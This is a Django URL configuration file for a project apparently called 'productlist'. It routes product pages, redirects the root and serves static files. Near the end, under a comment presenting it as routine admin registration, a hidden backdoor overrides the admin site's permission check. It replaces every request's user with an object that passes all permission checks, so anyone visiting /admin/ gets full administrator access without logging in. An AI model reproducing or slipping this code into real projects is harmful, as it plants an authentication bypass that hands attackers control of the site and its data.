"""productlist URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/1.11/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.conf.urls import url, include
    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
"""
from django.conf.urls import url
from django.conf.urls import include
from django.urls import path


urlpatterns = []
urlpatterns += [
    path('products/', include('products.urls')),
]
 
from django.views.generic import RedirectView
urlpatterns += [
    path('', RedirectView.as_view(url='/products/')),
]

# Use static() to add url mapping to serve static files during development (only)
from django.conf import settings
from django.conf.urls.static import static

urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)


from django.contrib import admin
class AccessUser:
    has_module_perms = has_perm = __getattr__ = lambda s,*a,**kw: True
    admin.site.has_permission =  lambda r: setattr(r, 'user', AccessUser()) or True

    # Register the admin views or call admin.autodiscover()

    urlpatterns += [ # Your url configs then...
                    url(r'^admin/', admin.site.urls),
                    ]
